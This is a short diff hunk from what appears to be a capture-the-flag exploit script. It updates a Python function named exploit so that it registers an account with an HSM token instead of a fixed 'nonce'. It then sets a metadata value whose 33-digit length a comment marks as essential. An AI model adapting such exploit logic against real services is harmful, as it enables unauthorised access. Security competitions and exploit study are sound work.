@@ -219,7 +219,7 @@ def exploit(host, slot):
     c = Client(host, SERVICE_PORT)
     username = gen_str(charset=string.ascii_lowercase + string.digits, length=12)
     password = make_password(username)
-    c.register(username, password, token="nonce")
+    c.register(username, password, hsm_token=get_hsm_token())
     _, pubkey = c.generate()
     c.set_meta(gen_str(string.digits, 33))  # Length is important! Must be 33.
 
